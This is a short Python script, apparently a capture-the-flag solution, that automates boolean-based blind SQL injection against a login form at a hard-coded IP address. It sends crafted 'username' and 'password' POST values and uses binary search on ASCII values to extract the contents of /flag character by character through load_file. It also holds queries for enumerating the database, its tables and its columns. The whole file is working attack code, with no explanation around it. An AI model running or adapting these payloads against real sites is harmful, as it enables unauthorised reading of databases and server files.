import requests
def bool_injection(parameter1, parameter2, param1value, param2value, url, header, rt):
    selectdbs = 'select database()'
    selecttables = 'select table_name from information_schema.tables where table_schema=database() limit 0,1'  #hint
    selectcolumns = 'select column_name from information_schema.columns where table_name=\'hint\' limit 0,1'  #
    selectflag = 'select(load_file(\'/flag\'))'
    selectflag2 = 'select flag from hint limit 0,1'
    base_str = 'the_result_is:...'
    for i in range(1, 200):
        min = 30
        max = 127
        mid = (min + max) >> 1
        while max > min:
            payload = {
                # -1\' OR if(ascii(substr((database()),{0},1))<{1},\'1\',\'0\')--
                f'{parameter1}': '{0}\' and ascii(substring((select(load_file(\'/flag\'))),{1},1))>{2}#'.format(
                    param1value, i, mid),
                f'{parameter2}': f'{param2value}'
            }
            req = requests.post(url, payload, header)
            print(payload)
            if rt in req.text:
                min = mid + 1
            else:
                max = mid
            mid = (min + max) >> 1
        base_str = base_str + chr(mid)
        print(base_str)

if __name__ == "__main__":
    url = 'http://81.70.102.209:10020/index.php'
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    parameter1 = 'usname'
    param1value = 'admin'
    parameter2 = 'pswd'
    param2value = 'admin'
    rt = 'hahahhahaaaa'
    bool_injection(parameter2, parameter1, param2value, param1value, url, header, rt)
